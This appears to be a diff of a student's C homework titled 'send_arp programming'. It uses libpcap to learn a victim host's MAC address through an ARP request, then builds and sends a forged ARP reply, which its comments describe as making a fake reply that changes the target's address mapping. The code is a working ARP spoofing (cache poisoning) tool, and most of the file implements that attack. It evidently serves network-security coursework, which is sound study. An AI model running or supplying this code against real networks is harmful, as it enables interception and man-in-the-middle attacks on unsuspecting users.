@@ -1,56 +1,54 @@
+/****************************************************************************************
+*                                                                                       *
+*   Subject : Subject 26                                                                *
+*   Prof : gilgil                                                                       *
+*   Student Name : Lim Kyung Dai                                                        * 
+*   Student ID : 2015410209                                                             *
+*                                                                                       *
+*   - HW2 : send_arp programming                                                        *
+*                                                                           	        *
+****************************************************************************************/
+
 #include <stdio.h>
-#include <sys/ioctl.h>
-#include <net/if.h> 
-#include <unistd.h>
-#include <netinet/in.h>
-#include <string.h>
-#include <pcap.h>
-#include <arpa/inet.h>    
-#include <stdlib.h>
-//get my mac addr
+#include "my_send_arp.h"
 
-//get others mac addr -- request
-
-/* Ethernet header */
-  struct sniff_ethernet {
-        
-  #define ETHER_ADDR_LEN 6
-        u_char ether_dhost[ETHER_ADDR_LEN]; /* Destination host address */
-        u_char ether_shost[ETHER_ADDR_LEN]; /* Source host address */
-        u_short ether_type; /* IP? ARP? RARP? etc */
-        };
-
-
-/* ARP Header, (assuming Ethernet+IPv4)            */ 
-#define ARP_REQUEST 1   /* ARP Request             */ 
-#define ARP_REPLY 2     /* ARP Reply               */ 
-  struct arphdr { 
-    u_int16_t htype;    /* Hardware Type           */ 
-    u_int16_t ptype;    /* Protocol Type           */ 
-    u_char hlen;        /* Hardware Address Length */ 
-    u_char plen;        /* Protocol Address Length */ 
-    u_int16_t oper;     /* Operation Code          */ 
-    u_char sha[6];      /* Sender hardware address */ 
-    u_char spa[4];      /* Sender IP address       */ 
-    u_char tha[6];      /* Target hardware address */ 
-    u_char tpa[4];      /* Target IP address       */ 
-}; 
-//attack
-
+void usage() {
+  printf("syntax: pcap_test <interface> [senderIP] [targetIP]\n");
+  printf("sample: pcap_test wlan0 192.168.163.134 192.168.163.2\n");
+}
 
 int main(int argc, char* argv[])
 {
+	if (argc < 4) {
+    	usage();
+    	return -1;
+  	}
+  	#define SIZE_ETHERNET 14
 	struct ifreq ifr;
     struct ifconf ifc;
+    struct in_addr senderIP, targetIP;
+    struct sniff_ethernet* eth;
+	struct sniff_ethernet* recv_eth;
+	struct arphdr* arp;
+	struct arphdr* recv_arp;
+	struct pcap_pkthdr* header;
+	u_char* packet;
     char buf[1024];
+    u_char mac_address[6];
+   	u_char recv_mac[6];
     int success = 0;
-    int i;
     int packet_len;
+   	int i;
 
+   	inet_pton(AF_INET,argv[2],&senderIP.s_addr);
+	inet_pton(AF_INET,argv[3],&targetIP.s_addr);
+
+/**************************************************************************************************
+										    get my mac address
+***************************************************************************************************/
     int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_IP);
     if (sock == -1) { /* handle error*/ };
 
-    
     ifc.ifc_len = sizeof(buf);
     ifc.ifc_buf = buf;
     if (ioctl(sock, SIOCGIFCONF, &ifc) == -1) { /* handle error */ }
@@ -71,10 +69,9 @@ int main(int argc, char* argv[])
         else { /* handle error */ }
     }
 
-    unsigned char mac_address[6];
-
     if (success) memcpy(mac_address, ifr.ifr_hwaddr.sa_data, 6);
 
+    printf("\n[+]My Mac Address : ");
     for(i=0;i<6;i++)
     {
     		printf("%02x",mac_address[i]);
@@ -83,30 +80,21 @@ int main(int argc, char* argv[])
     }
     printf("\n");
 
+/**************************************************************************************************
+										    get my ip address
+***************************************************************************************************/
 	ifr.ifr_addr.sa_family = AF_INET;
 	strncpy(ifr.ifr_name , argv[1] , IFNAMSIZ - 1);
 	ioctl(sock, SIOCGIFADDR, &ifr);
 	struct in_addr my_ip_addr = ((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr;
 
-	printf("IP Address is %s\n",inet_ntoa(my_ip_addr));
+	printf("[+]My IP Address  : %s\n",inet_ntoa(my_ip_addr));
 
 	close(sock);
 
-   /////////////////////////////////////////////////////////////////////////////////////
-   //make packet 
-    struct in_addr senderIP, targetIP;
-	u_char* packet;
-	struct sniff_ethernet* eth;
-	struct sniff_ethernet* recv_eth;
-	struct arphdr* arp;
-	struct arphdr* recv_arp;
-	struct pcap_pkthdr* header;
-	u_char recv_mac[6];
-
-	#define SIZE_ETHERNET 14
-
-    inet_pton(AF_INET,argv[2],&senderIP.s_addr);
-	inet_pton(AF_INET,argv[3],&targetIP.s_addr);
+/**************************************************************************************************
+									   make a broadcast packet
+***************************************************************************************************/
 
 	eth = (struct sniff_ethernet*)malloc(sizeof(struct sniff_ethernet));
 	arp = (struct arphdr*)malloc(sizeof(struct arphdr));
@@ -127,30 +115,31 @@ int main(int argc, char* argv[])
 	memcpy(packet,eth,sizeof(struct sniff_ethernet));
 	memcpy(packet+sizeof(struct sniff_ethernet),arp,sizeof(struct arphdr));
 	packet_len = sizeof(struct sniff_ethernet) + sizeof(struct arphdr);
+	printf("\n[*]A broadcast packet is made.\n");
 
-	printf("packet_len : %d\n",packet_len);
+/**************************************************************************************************
+									 send a broadcast packet
+***************************************************************************************************/
 
-  char* dev = argv[1];
-  char errbuf[PCAP_ERRBUF_SIZE];
-  pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
-  if (handle == NULL) {
-    fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
-    return -1;
-  }
-/*
-	printf("\n[+] packet to send\n");
-	for(int i=0;i<packet_len;i++){
-		if(i != 0 && i%16 == 0)
-			printf("\n");
-		printf("%02x ",*(packet+i));
-	}
-	printf("end\n");
-*/
+  	char* dev = argv[1];
+ 	char errbuf[PCAP_ERRBUF_SIZE];
+ 	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
+ 	if (handle == NULL) {
+    	fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
+    	return -1;
+  	}
   	
 	while(1){
-		if(pcap_sendpacket(handle,packet,packet_len) == 0)
+		if(pcap_sendpacket(handle,packet,packet_len) == 0){
+			printf("\n[*]Send a packet to get a [%s]'s Mac Address\n",inet_ntoa(senderIP));
+			printf("\n[*]ARP REQUEST![*]\n");	
 			break;
+		}
 	}
+
+/**************************************************************************************************
+									 receive a reply packet
+***************************************************************************************************/	
 	
 	while (1) {
     int res = pcap_next_ex(handle, &header, &packet);
@@ -171,17 +160,19 @@ int main(int argc, char* argv[])
   	
 			u_char* ip_buf_tmp = (u_char*)malloc(4);
     		sprintf(ip_buf_tmp, "%x%x%x%x",recv_arp->spa[3],recv_arp->spa[2],recv_arp->spa[1],recv_arp->spa[0]);
-    		printf("senderIP.s_addr : %x\n",senderIP.s_addr);
-    		printf("ip_buf_tmp : %x \n",strtol(ip_buf_tmp,&ptr,16));
+    		
     		if(senderIP.s_addr == strtol(ip_buf_tmp,&ptr,16))
     		{
+    			printf("\n[*]ARP_REPLY![*]\n");
+    			printf("\n[+]packet binary[+]");
     			for(i=0;i<60;i++)
-   				{
+   				{	
+   					if(i%8 == 0) printf("\n");
     				printf("%02x ",packet[i]);
     			}
     			printf("\n");
     			memcpy(recv_mac,recv_eth->ether_shost,6);
-    			printf("recv_mac : ");
+	    		printf("\n[+]Sender's Mac Address : ");
     			for(i=0;i<6;i++)
     			{
     				printf("%02x",recv_mac[i]);
@@ -194,6 +185,10 @@ int main(int argc, char* argv[])
     }
     break;
 }
+/**************************************************************************************************
+									 make a fake reply packet
+***************************************************************************************************/
+
 	eth = (struct sniff_ethernet*)malloc(sizeof(struct sniff_ethernet));
 	arp = (struct arphdr*)malloc(sizeof(struct arphdr));
 	memcpy(eth->ether_dhost,recv_mac,ETHER_ADDR_LEN);
@@ -213,24 +208,16 @@ int main(int argc, char* argv[])
 	memcpy(packet,eth,sizeof(struct sniff_ethernet));
 	memcpy(packet+sizeof(struct sniff_ethernet),arp,sizeof(struct arphdr));
 	packet_len = sizeof(struct sniff_ethernet) + sizeof(struct arphdr);
+	printf("\n[*]A fake reply packet is made.\n");
 
+/**************************************************************************************************
+									 send a fake reply packet
+***************************************************************************************************/
 	while(1){
-		if(pcap_sendpacket(handle,packet,packet_len) == 0)
+		if(pcap_sendpacket(handle,packet,packet_len) == 0){
+			printf("\n[*]Send a fake reply packet to change [%s]'s Mac Address ",inet_ntoa(targetIP));
+			printf("into [%s]'s Mac Address.\n",inet_ntoa(my_ip_addr));
 			break;
+		}
 	}
-	
-} 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
+} 	
